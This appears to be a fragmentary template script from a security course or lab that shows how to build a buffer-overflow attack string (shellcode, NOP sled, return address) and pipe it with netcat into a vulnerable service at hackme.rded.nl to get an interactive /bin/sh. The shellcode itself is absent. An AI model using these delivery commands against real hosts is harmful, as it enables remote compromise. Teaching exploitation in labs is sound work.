## You can assign the output of a shell command to a variable as follows:   #
#                                                                           #
# variable="$(echo bla)"                                                    #
#                                                                           #
## Append the output of a shell command to a variable as follows:           #
#                                                                           #
# variable="${variable}$(echo bla)"                                         #
#                                                                           #
## Append a string 'str' to a variable as follows:                          #
#                                                                           #
# variable="${variable}str"                                                 #

# - An argument that generates the right shellcode
# - An argument that specifies the number of NOPs preceding the shellcode
# - Handle the return address

# that many bytes of buffer.

### How to get the resulting attack string into the vulnerable process ######
#                                                                           #
## You can either redirect the output of this script directly into the      #
## vulnerable process by running it on the commandline as:                  #
# ./attack.sh 10 | nc hackme.rded.nl 54321                                  #
#                                                                           #
## Or you can start the process from within the script and do that          #
## redirection internally.                                                  #
#                                                                           #
## Examples of both ways below.                                             #
#                                                                           #

# This echo's attackstr to the stdout of the script, so you can run it as
# ./attack.sh 10 | nc hackme.rded.nl 54321
# Note that echo also writes a newline at the end. If you're attacking gets,
# that's probably what you want, but otherwise, you may need "echo -n" to
# suppress the newline.
(echo "$attackstr") | nc hackme.rded.nl 50001 >&2
echo >$2

# Following echoing the attack string, if you're executing the /bin/sh
# shellcode, you probably want to be able to type commands. You can do this
# from outside the script by running it as
# (./attack.sh 10; cat -) | nc hackme.rded.nl 54321
# but you can also make the script itself redirect its stdin to stdout by
# enabling the following line:
#cat -
# Close the input with ctrl+D when you're done, or need to execute some more
# code underneath it.

### Examples to run the netcat process from within the script ###############
#                                                                           #
## This invocation echo's attackstr directly into a new connection to the   #
## vulnerable program, then closes the input. You cannot give any input     #
## after it. Might be useful if you want to use a loop...                   #
## Enable it if you want to run the /bin/ls shell code (./shellcode list)   #
## and remember to set PORT to the right port somewhere.                    #
# echo "$attackstr" | nc hackme.rded.nl ${PORT}
#                                                                           #
## The following composed command allows stdin to remain open, which would  #
## otherwise have been closed by the EOF sent by echo.                      #
## Can be used to run the /bin/sh shell code (./shellcode shell)            #
## Remember you can close cat's input using ctrl+D.                         #
# (echo "$attackstr"; cat -) | nc hackme.rded.nl ${PORT}
#                                                                           #
